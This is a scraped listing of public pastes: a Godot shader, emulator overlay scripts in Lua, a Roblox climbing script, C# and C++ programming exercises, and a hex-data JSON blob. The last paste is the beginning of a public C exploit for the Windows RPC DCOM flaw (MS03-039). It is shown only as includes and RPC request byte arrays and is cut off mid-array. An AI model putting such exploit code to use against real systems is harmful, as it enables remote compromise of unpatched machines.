	float angle = atan(uv.x, uv.y)+3.14159265359;
	float slice = 6.28318530718/sides;
	return clamp((1.0-(cos(floor(0.5+angle/slice)*slice-angle)*length(uv))/size)/edge, 0.0, 1.0);
}


vec2 transform2_clamp(vec2 uv) {
	return clamp(uv, vec2(0.0), vec2(1.0));
}

vec2 transform2(vec2 uv, vec2 translate, float rotate, vec2 scale) {
 	vec2 rv;
	uv -= translate;
	uv -= vec2(0.5);
	rv.x = cos(rotate)*uv.x + sin(rotate)*uv.y;
	rv.y = -sin(rotate)*uv.x + cos(rotate)*uv.y;
	rv /= scale;
	rv += vec2(0.5);
	return rv;
}


uniform float width = 0.1;
uniform float lenght = 0.4;
uniform float spread = 0.265;

const float p_o166635_translate_y = 0.000000000;
const float p_o166635_rotate = 90.000000000;

const float p_o68924_sides = 4.000000000;
const float p_o68924_radius = 0.990000000;
const float p_o68924_edge = 0.000000000;
const float p_o262102_translate_y = 0.000000000;
const float p_o262102_rotate = 90.000000000;
const float p_o262105_sides = 4.000000000;
const float p_o262105_radius = 0.990000000;
const float p_o262105_edge = 0.000000000;
const float p_o329162_translate_x = 0.000000000;
const float p_o329162_rotate = 0.000000000;
const float p_o329171_sides = 4.000000000;
const float p_o329171_radius = 0.990000000;
const float p_o329171_edge = 0.000000000;
const float p_o329165_translate_x = 0.000000000;
const float p_o329165_rotate = 0.000000000;
const float p_o329168_sides = 4.000000000;
const float p_o329168_radius = 0.990000000;
const float p_o329168_edge = 0.000000000;

void fragment() {
float o68924_0_1_f = shape_polygon((transform2_clamp(transform2((UV), vec2(spread*(2.0*1.0-1.0), p_o166635_translate_y*(2.0*1.0-1.0)), p_o166635_rotate*0.01745329251*(2.0*1.0-1.0), vec2(width*(2.0*1.0-1.0), lenght*(2.0*1.0-1.0))))), p_o68924_sides, p_o68924_radius*1.0, p_o68924_edge*1.0);
vec4 o166635_0_1_rgba = vec4(vec3(o68924_0_1_f), 1.0);
float o262105_0_1_f = shape_polygon((transform2_clamp(transform2((UV), vec2(-spread*(2.0*1.0-1.0), p_o262102_translate_y*(2.0*1.0-1.0)), p_o262102_rotate*0.01745329251*(2.0*1.0-1.0), vec2(width*(2.0*1.0-1.0), lenght*(2.0*1.0-1.0))))), p_o262105_sides, p_o262105_radius*1.0, p_o262105_edge*1.0);
vec4 o262102_0_1_rgba = vec4(vec3(o262105_0_1_f), 1.0);
float o329171_0_1_f = shape_polygon((transform2_clamp(transform2((UV), vec2(p_o329162_translate_x*(2.0*1.0-1.0), spread*(2.0*1.0-1.0)), p_o329162_rotate*0.01745329251*(2.0*1.0-1.0), vec2(width*(2.0*1.0-1.0), lenght*(2.0*1.0-1.0))))), p_o329171_sides, p_o329171_radius*1.0, p_o329171_edge*1.0);
vec4 o329162_0_1_rgba = vec4(vec3(o329171_0_1_f), 1.0);
float o329168_0_1_f = shape_polygon((transform2_clamp(transform2((UV), vec2(p_o329165_translate_x*(2.0*1.0-1.0), -spread*(2.0*1.0-1.0)), p_o329165_rotate*0.01745329251*(2.0*1.0-1.0), vec2(width*(2.0*1.0-1.0), lenght*(2.0*1.0-1.0))))), p_o329168_sides, p_o329168_radius*1.0, p_o329168_edge*1.0);
vec4 o329165_0_1_rgba = vec4(vec3(o329168_0_1_f), 1.0);
float o293599_0_h = 0.0;
int o293599_0_i = 0;

float o293599_0_h1 = (dot((o166635_0_1_rgba).rgb, vec3(1.0))/3.0);
if (o293599_0_h1 > o293599_0_h) {
	o293599_0_h = o293599_0_h1;
	o293599_0_i = 1;
}

float o293599_0_h2 = (dot((o262102_0_1_rgba).rgb, vec3(1.0))/3.0);
if (o293599_0_h2 > o293599_0_h) {
	o293599_0_h = o293599_0_h2;
	o293599_0_i = 2;
}

float o293599_0_h3 = (dot((o329162_0_1_rgba).rgb, vec3(1.0))/3.0);
if (o293599_0_h3 > o293599_0_h) {
	o293599_0_h = o293599_0_h3;
	o293599_0_i = 3;
}

float o293599_0_h4 = (dot((o329165_0_1_rgba).rgb, vec3(1.0))/3.0);
if (o293599_0_h4 > o293599_0_h) {
	o293599_0_h = o293599_0_h4;
	o293599_0_i = 4;
}
float o293599_0_1_f = o293599_0_h;
	COLOR = vec4(vec3(o293599_0_1_f), o293599_0_1_f);
}
"
q3LJfNW5,Untitled,BobbyGeorgiev,C#,Saturday 2nd of March 2024 06:08:54 AM CDT,"int[] numbers = Console.ReadLine()
    .Split()
    .Select(int.Parse)
    .ToArray();

int startIndex = int.Parse( Console.ReadLine() );
int endIndex = int.Parse( Console.ReadLine() );

int maxNumber = int.MinValue;
int minNumber = int.MaxValue;
for ( int i = startIndex; i <= endIndex; i++)
{
    if (numbers[i] > maxNumber)
    {
        maxNumber = numbers[i];
    }
    if (numbers[i] < minNumber)
    {
        minNumber = numbers[i];
    }
}
Console.WriteLine(maxNumber + minNumber);"
WHkamUtj,data857,TestGuy1,JSON,Saturday 2nd of March 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '62032f5531aa63eda7a0ce51cdc4f700887e972bb526ac850a8404fc240fa122820efc802b4ef03e93b1bec42667eea27623cd957efa09bbee0cb0bae9711166381627f5d5d2dade1d5be623ddc80eccab813355bfa869309b2f84944df4e32565a28265b78cf8819265eaf3e5fff0ae0c3b3b357b7def4db0efc83a718599fa',
  otherdata: [
    'be697281beae588deeb77c7ff6a41b78',
    '57caa3ddf4d8d40e9d7cb7ee3dcc4e13',
    '21e901c2eab9fcd63a609e74c592e90b',
    '426ada91e1f268bcc448863b90164e75',
    'ba76be1365d926942f2304cf543ae856',
    '7fc7d8bc4bf737aa25b351e3e6572e53',
    '0d32edde071dc1424d5e44cce37cb1fd',
    '607a98edf38708dbea529387ec647c90'
  ]
}"
N5ZQdSC1,WL2 Overlay Bizhawk 2.9.1,pr0te,Lua,Saturday 2nd of March 2024 05:42:45 AM CDT,"-- Written by slamo
-- Updated for Bizhawk 2.9.1+

bit = (require ""migration_helpers"").EmuHawk_pre_2_9_bit();

local x, y, camx, camy, tref, ttype, ttypehigh, tcolor, warpdest

function bitswap (swappy)
	nib2 = bit.band(swappy,0xF)
	return (nib2*0x10+bit.rshift(swappy,4))
end

function gettile (wx,wy)
	hix = bit.rshift(bit.band(0xFF00,wx),8)
	hiy = bit.rshift(bit.band(0xFF00,wy),8)
	lox = bit.band(0xFF,wx)
	loy = bit.band(0xFF,wy)
	ccea = bit.band(bitswap(bit.band(hiy,0x0F))+bit.band(bitswap(loy),0x0F)+0xA0,0xFF)
	cceb = bitswap(bit.band(hix,0x0F))+bit.band(bitswap(lox),0x0F)
	rawloc = ccea*0x100+cceb -- not the final location!!! can vary if above 0xa000
	return (rawloc)
	-- return (bit.band(0x2000 + 0x100*math.floor(wy/16+1) + math.floor(wx/16),0x7FFF)) works for most space, not glitch rooms
end

function tileid (ntile)
	if (ntile >= 0xa000) then
		memory.usememorydomain('CartRAM') -- where normal level data is
		realloc = ntile - 0x8000
	else
		memory.usememorydomain('System Bus')
		realloc = ntile
	end
	tlookup = memory.readbyte(realloc)
	memory.usememorydomain('ROM')
	return (memory.read_u16_le(0x7c002+tref+bit.band(tlookup*2,0xFF)))
end

while true do
	x = mainmemory.read_u16_be(0x153c) -- position in level
	y = mainmemory.read_u16_be(0x153a)
	camx = mainmemory.readbyte(0x660) -- position relative to upper left camera edge
	camy = mainmemory.readbyte(0x65f)
	tref = mainmemory.read_u16_be(0x704)
	-- warpdest = mainmemory.readbyte(0xa1) -- sector coordinates for a warp (??)
	-- 160x144
	--gui.drawText(3,130,string.format(""%X"",bit.rshift(warpdest,4))..' '..string.format(""%X"",bit.band(warpdest,0xF)))
	for i = -1,17,1 do
		for j = -1,17,1 do
			ttype = tileid(gettile(x-camx+15+16*i,y-camy+15+16*j))
			ttypehigh = bit.band(ttype,0xFF00)
			if (ttype~=0x47ab) and (ttype~=0x49a7) and not ((ttype>=0x4e29) and (ttype<=0x4e39)) and not ((ttype>=0x5400) and (ttype<=0x54ff)) then
			--if (ttype~=0x47ab) and (ttype~=0x4cf3) and (ttype~=0x4cef) and (ttype~=0x4d03) and (ttype~=0x4cff) and (ttype~=0x4e29) and (ttype~=0x4e35) and (ttype~=0x4f3a) then
				if (ttype==0x4ecd) or (ttype==0x4edb) or (ttype==0x4f3a) then -- door, minigame, exit
					tcolor = 'BLACK' 
				elseif (ttype==0x4e8a) then -- water
					tcolor = 'BLUE'
				elseif (ttype==0x4a10) then -- platform
					tcolor = 'WHITE'
				elseif (ttype>0x4a70) and (ttype<0x4d9f) or (ttype==0x4a10) then -- breakable
					tcolor = 'PINK'
				else -- solid or unknown
					tcolor = 'RED' 
				end
				gui.drawBox((camx-x)%16-8+16*i,(camy-y)%16-16+16*j,(camx-x)%16+7+16*i,(camy-y)%16+16*j-1,tcolor)
			end
		end
	end
	gui.drawText(3,3,string.format(""%X"",gettile(x,y-32))..' '..string.format(""%X"",tileid(gettile(x,y-32))))
	gui.drawText(3,12,string.format(""%X"",gettile(x,y-16))..' '..string.format(""%X"",tileid(gettile(x,y-16))))
	gui.drawText(3,21,string.format(""%X"",gettile(x,y))..' '..string.format(""%X"",tileid(gettile(x,y))))
	emu.frameadvance()
end"
HiF2MjQk,WL3 Overlay Bizhawk 2.9.1,pr0te,Lua,Saturday 2nd of March 2024 05:40:58 AM CDT,"-- Written by slamo
-- Updated for Bizhawk 2.9.1+

bit = (require ""migration_helpers"").EmuHawk_pre_2_9_bit();

local x, y, camx, camy, ttype, tile, ttypehigh, tcolor, warpdest

function bitswap (swappy)
	nib2 = bit.band(swappy,0xF)
	return (nib2*0x10+bit.rshift(swappy,4))
end

function gettile (wx,wy)
	hix = bit.rshift(bit.band(0xFF00,wx),8)
	hiy = bit.rshift(bit.band(0xFF00,wy),8)
	lox = bit.band(0xFF,wx)
	loy = bit.band(0xFF,wy)
	ccea = bit.band(bitswap(bit.band(hiy,0x0F))+bit.band(bitswap(loy),0x0F)+0xA0,0xFF)
	cceb = bitswap(bit.band(hix,0x0F))+bit.band(bitswap(lox),0x0F)
	rawloc = ccea*0x100+cceb -- not the final location!!! can vary if above 0xa000
	return (rawloc)
	-- return (bit.band(0x2000 + 0x100*math.floor(wy/16+1) + math.floor(wx/16),0x7FFF)) works for most space, not glitch rooms
end

function tileid (ntile)
	if (ntile >= 0xa000) then
		memory.usememorydomain('CartRAM') -- where normal level data is
		realloc = ntile - 0x8000
	else
		memory.usememorydomain('System Bus')
		realloc = ntile
	end
	tlookup = memory.readbyte(realloc)
	return (mainmemory.read_u16_le(0xd00+bit.band(tlookup*2,0xFF)))
end

while true do
	x = mainmemory.read_u16_be(0xa63) -- position in level
	y = mainmemory.read_u16_be(0xa61)
	camx = mainmemory.readbyte(0xa88) -- position relative to upper left camera edge
	camy = mainmemory.readbyte(0xa87)
	--warpdest = mainmemory.readbyte(0xa1) -- sector coordinates for a warp (??)
	-- 160x144
	--gui.drawText(3,130,string.format(""%X"",bit.rshift(warpdest,4))..' '..string.format(""%X"",bit.band(warpdest,0xF)))
	for i = -1,17,1 do
		for j = -1,17,1 do
			tile = gettile(x-camx+15+16*i,y-camy+15+16*j)
			ttype = tileid(tile)
			ttypehigh = bit.band(ttype,0xFF00)
			if (ttype~=0x4020) and (ttype~=0x4821) and (ttype~=0x484c) and (ttype~=0x4262) then
				if (ttype==0x45CB) or (ttype==0x45FA) or (ttype==0x477e) or (ttype==0x46f9) or (ttype==0x47b0) or (ttype==0x47de) then -- door, golf door, exit, warp tile
					tcolor = 'BLACK' 
				elseif (ttype>0x49F0) and (ttype<0x54b4) then -- breakable
					tcolor = 'PINK'
				elseif (ttype==0x4208) or (ttype==0x49ae) or (ttype==0x423f) then -- platform
					tcolor = 'WHITE'
				elseif (ttype==0x42c3) or (ttype==0x42e5) or (ttype==0x42fe) or (ttype==0x4934) then -- ladder
					tcolor = 'BROWN'
				elseif (ttype>0x41a0) and (ttype<0x41ff) then -- water
					tcolor = 'BLUE'
				else -- solid or unknown
					tcolor = 'RED' 
				end
				gui.drawBox((camx-x)%16-8+16*i,(camy-y)%16-16+16*j,(camx-x)%16+7+16*i,(camy-y)%16+16*j-1,tcolor)
			end
		end
	end
	gui.drawText(3,3,string.format(""%X"",gettile(x,y-32))..' '..string.format(""%X"",tileid(gettile(x,y-32))))
	gui.drawText(3,12,string.format(""%X"",gettile(x,y-16))..' '..string.format(""%X"",tileid(gettile(x,y-16))))
	gui.drawText(3,21,string.format(""%X"",gettile(x,y))..' '..string.format(""%X"",tileid(gettile(x,y))))
	emu.frameadvance()
end"
GGjWZTdj,WallClimbing,Joriangames,Lua,Saturday 2nd of March 2024 05:20:10 AM CDT,"-- How To Make WALLCLIMB in Roblox Studio!! by BLOXIANCODE youtube.com/c/BloxianCode
-- Tutorial: https://youtu.be/4vf8wg3rGlg

local HumRootPart = script.Parent:WaitForChild(""HumanoidRootPart"")
local humanoid = script.Parent:WaitForChild(""Humanoid"")
local char = script.parent
local part = nil

local ClimbAnimation = humanoid:LoadAnimation(char.Animate.climb.ClimbAnim)

game:GetService(""RunService"").Heartbeat:Connect(function()
        local params = RaycastParams.new()
  		params.FilterDescendantsInstances = {char}
        
        if char:FindFirstChild(""LeftFoot"") then --checking if player is R15
            local result = workspace:Raycast(char.LeftFoot.Position, HumRootPart.CFrame.LookVector * 1.5, params)
            part = result and result.Instance or nil
        else
            local result = workspace:Raycast(char[""Left Leg""].Position, HumRootPart.CFrame.LookVector * 1.5, params)
            part = result and result.Instance or nil
        end
        
        if part then
        	HumRootPart.Velocity = Vector3.new(HumRootPart.Velocity.X, 15, HumRootPart.Velocity.Z) --15 is speed
            if humanoid:GetState() ~= Enum.HumanoidStateType.Climbing then
            	humanoid:ChangeState(Enum.HumanoidStateType.Climbing)
            end
            
            if not ClimbAnimation.IsPlaying then
            	ClimbAnimation:Play()
            end
            
        else
            ClimbAnimation:Stop()
        end
end)"
YGrwabc1,различные числа (Мо),ke_timofeeva7,C++,Saturday 2nd of March 2024 05:00:17 AM CDT,"#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <cmath>
#include <algorithm>
#include <memory.h>
#include <stdio.h>
#include <stack>
#include <deque>
#include <queue>
#include <set>
#include <iterator>
#include <map>
#include <iomanip>
#include <unordered_map>
#include <unordered_set>
#include <array>
//#define int long long
#define pb push_back
#define fir first
#define sec second
#define double long double
#define endl ""\n""
#define un unsigned
#define INF 1000000000009
#define EPS 0.000000000001
#define pii pair<int, int>
#define all(v) v.begin(), v.end()
using namespace std;

const int N = 1000009, R = 1 << 20, logn = 19, ABC = 26, BUBEN = 350;

struct S {
    int first, second, id;
    S(int a, int b, int c) : fir(a), sec(b), id(c) {}
    S() {}
};

bool cmp(S a, S b) {
    if (a.first / BUBEN == b.first / BUBEN)
        return a.second < b.second;
    return a.first < b.first;
}

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(0);
    cout.tie(0);

    int n;
    cin >> n;

    vector<int> vc(n);

    for (int& i : vc)
        cin >> i;

    vector<int> a = vc;
    sort(all(a));
    a.erase(unique(all(a)), a.end());

    for (int i = 0; i < n; i++)
        vc[i] = lower_bound(all(a), vc[i]) - a.begin();

    int q;
    cin >> q;

    vector<S> query(q);
    int id = 0;
    for (auto& i : query) {
        cin >> i.first >> i.second;
        i.id = id;
        id++;
    }
    sort(all(query), cmp);

    int pr = -1;
    int ll = -1, rr = -1;
    vector<int> cnt(a.size());
    vector<int> ans(q);
    int answer = 0;
    for (int i = 0; i < q; i++) {
        int l = query[i].first, r = query[i].second;
        l--;
        r--;
        if (pr == -1) {            
            for (int j = l; j <= r; j++) {
                cnt[vc[j]]++;
                if (cnt[vc[j]] == 1)
                    answer++;
            }
            ll = l;
            rr = r;
            pr = 0;
        }
        else {
            while (ll > l) {
                ll--;
                cnt[vc[ll]]++;
                if (cnt[vc[ll]] == 1)
                    answer++;
            }
            while (rr < r) {
                rr++;
                cnt[vc[rr]]++;
                if (cnt[vc[rr]] == 1)
                    answer++;
            }

            while (ll < l) {
                cnt[vc[ll]]--;
                if (cnt[vc[ll]] == 0)
                    answer--;
                ll++;
            }
            while (rr > r) {
                cnt[vc[rr]]--;
                if (cnt[vc[rr]] == 0)
                    answer--;
                rr--;
            }
        }
        ans[query[i].id] = answer;
    }
    for (int i : ans)
        cout << i << endl;
    return 0;
}"
LBNyf507,Untitled,Josif_tepe,C++,Saturday 2nd of March 2024 04:59:00 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;
int main() {
    int n, q;
    cin >> n >> q;
    int niza[n];
    int idx[55];
    for(int i = 1; i <= 50; i++) {
        idx[i] = 0;
    }
    for(int i = 0; i < n; i++) {
        cin >> niza[i];
        if(idx[niza[i]] == 0) {
            idx[niza[i]] = i + 1;
        }
    }
    for(int i = 0; i < q; i++) {
        int x;
        cin >> x;
        cout << idx[x] << "" "";
        for(int j = 1; j <= 50; j++) {
            if(idx[j] < idx[x] and idx[j] != 0) {
                idx[j]++;
            }
        }
        idx[x] = 1;
        
    }
    return 0;
}

//n = 27 - 4 = 23
// 89 145 42 20 4 16 37 58
// 23 % 8 = 7
"
1RinUzJS,Untitled,35657,C++,Saturday 2nd of March 2024 04:55:18 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>

using namespace std;

class String {

public:

	String() : size_(0), capacity_(15), str_(new char[capacity_]) {
		total_number_string_++;
	}

	explicit String(const int string_capacity) : size_(0), capacity_(string_capacity), str_(new char[capacity_]) {
		total_number_string_++;
	} // здесь ставим explicit во избежание неявного приведения int к string

	String(const char* new_string) : size_(strlen(new_string)), capacity_(size_ + 1), str_(new char[capacity_]) {
		strcpy(str_, new_string);
		total_number_string_++;
	} // здесь explicit можно не ставить чтобы иметь возможность преобразовать символьный массив к String

	String(const String& other) : size_(other.size_), capacity_(other.capacity_), str_(new char[capacity_]) {
		strcpy(str_, other.str_);
		total_number_string_++;
	}

	String(String&& other) : size_(other.size_), capacity_(other.capacity_), str_(other.str_) {
		other.str_ = nullptr;
		other.size_ = 0;
		other.capacity_ = 0;
		total_number_string_++;
	}

	String& operator=(const String& other) {
		if (&other != this) { // проверка на самоприсваивание
			size_ = other.size_;
			capacity_ = other.capacity_;
			delete[] str_;
			str_ = new char[capacity_];
			strcpy(str_, other.str_);
		}
		return *this;
	} // переопределение копирующего оператора присваивания для String

	String& operator=(String&& other) {
		if (&other != this) { // проверка на самоприсваивание
			size_ = other.size_;
			capacity_ = other.capacity_;
			delete[] str_;
			str_ = other.str_;
			other.str_ = nullptr;
			other.size_ = 0;
			other.capacity_ = 0;
		}
		return *this;
	} // переопределение перемещающего оператора присваивания для String

	String& operator=(const char* str) {
        size_ = strlen(str);
        capacity_ = size_ + 1;
        delete[] str_;
        str_ = new char[capacity_];
        strcpy(str_, str);
        return *this;
    } // переопределение копирующего оператора присваивания для строкового литерала

	const char* get_string() const {
		return str_;
	}


	int size() const {
		return size_;
	}

	int capacity() const {
		return capacity_;
	}

	bool operator==(const String& other) const {
		return !strcmp(str_, other.str_);
	}

	bool operator!=(const String& other) const {
		return strcmp(str_, other.str_);
	}

	char& operator[](const int index) {
		if (index < 0 || index >= size_) {
			cout << ""Некорректный индекс"" << endl;
		}
		return str_[index];
	}

	char operator[](const int index) const {
		if (index < 0 || index >= size_) {
			cout << ""Некорректный индекс"" << endl;
		}
		return str_[index];
	}

	static int get_total_number_strings() {
		return total_number_string_;
	}

	~String() {
		delete[] str_;
		total_number_string_--;
	}


private:
	int size_;
	int capacity_;
	char* str_;
	static int total_number_string_;
};

ostream& operator<<(ostream& output, const String& string) {
	output << string.get_string();
	return output;
} // переопределение оператора вывода в поток

istream& operator>>(istream& input, String& string) {
	int capacity = 15;
	int i = 0;
	char* str = new char[capacity];
	char ch;
	while (ch = input.get()) {
		if (ch == ' ' || ch == '\n') {
			break;
		}
		if (i == capacity - 1) {
			char* temp = new char[capacity *= 2];
			for (int j = 0; j < i; j++) {
				temp[j] = str[j];
			}
			delete[] str;
			str = temp;
		}
		str[i] = ch;
		i++;
	}
	str[i] = '\0';
	string = str;
	return input;
} // переопределение оператора чтения из потока



int String::total_number_string_ = 0;

int main() {
	setlocale(LC_ALL, ""ru"");

	String str1;

	String str2(30);

	cout << String::get_total_number_strings() << endl;

	String str3(""Привет"");

	cout << str3 << endl;

	str3 = ""Новая строка"";

	cout << str3 << endl;

	str1 = ""Еще одна новая строка"";

	cout << str1 << endl;

	String str4(str3);

	cout << str3 << endl;

	cout << str4 << endl;

	cout << (str1 == str4) << endl;
	cout << (str3 == str4) << endl;
	cout << (str1 != str4) << endl;
	cout << (str3 != str4) << endl;

	String str5;
	str5 = str1;
	cout << str5 << endl;
	str5 = str5;
	str5[0] = 'Т';
	cout << str5 << endl;

	String str7 = ""Привет"";

	cout << str7[0] << endl;

	cout << str7 << endl;

	String str8;
	str8 = move(str7);
}
"
EjUdxLXy,Untitled,Josif_tepe,C++,Saturday 2nd of March 2024 04:36:38 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;
int main() {
    int p, n;
    cin >> p >> n;
    
    int niza[200], j = 0;
    for(int i = 0; i < 100; i++) {
        int tmp = p;
        int sum = 0;
        while(tmp > 0) {
            int cifra = tmp % 10;
            cifra *= cifra;
            sum += cifra;
            
            tmp /= 10;
        }
        if(i == n) {
            cout << p << endl;
            return 0;
        }
        niza[j] = p;
        j++;
        p = sum;
    }
    int povtoruvanja[200], o = 0;
    for(int i = 0; i < j; i++) {
        int se_povtoruva = -1;
        for(int k = i + 1; k < j; k++) {
            if(niza[i] == niza[k]) {
                se_povtoruva = k - 1;
                break;
            }
        }
        if(se_povtoruva != -1) {
            n -= i;
            for(int k = i; k <= se_povtoruva; k++) {
                povtoruvanja[o] = niza[k];
                o++;
            }
            break;
        }
    }
    
    if(n % o == 0) {
        cout << povtoruvanja[0] << endl;
    }
    else {
        cout << povtoruvanja[n % o] << endl;
    }
    return 0;
}

//n = 27 - 4 = 23
// 89 145 42 20 4 16 37 58
// 23 % 8 = 7
"
kxPzHUnS,Untitled,Josif_tepe,C++,Saturday 2nd of March 2024 04:16:33 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;
int main() {
    int p, n;
    cin >> p >> n;
    
    for(int i = 0; i < n; i++) {
        int tmp = p;
        int sum = 0;
        while(tmp > 0) {
            int cifra = tmp % 10;
            cifra *= cifra;
            sum += cifra;
            
            tmp /= 10;
        }
        p = sum;
    }
    cout << p << endl;
    return 0;
}

"
vEWmCfb0,Microsoft Windows - 'RPC DCOM2' Remote (MS03-039) - CVE-2003-0605,FlyFar,C,Saturday 2nd of March 2024 03:48:43 AM CDT,"/*
        RPCDCOM2.c  ver1.1
        copy by FLASHSKY flashsky at xfocus.org  2003.9.14
   */
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <string.h>
#include <winbase.h>

unsigned char bindstr[]={
0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,
0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,
0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,
0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,
0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};

unsigned char request1[]={
0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03
,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00
,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45
,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E
,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D
,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41
,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00
,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45
,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00
,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00
,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03
,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00
,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29
,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00
,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00
,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10
,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF
,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10
,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09
,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00
,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00
,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00
,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00
,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01
,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03
,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00
,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E
,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00
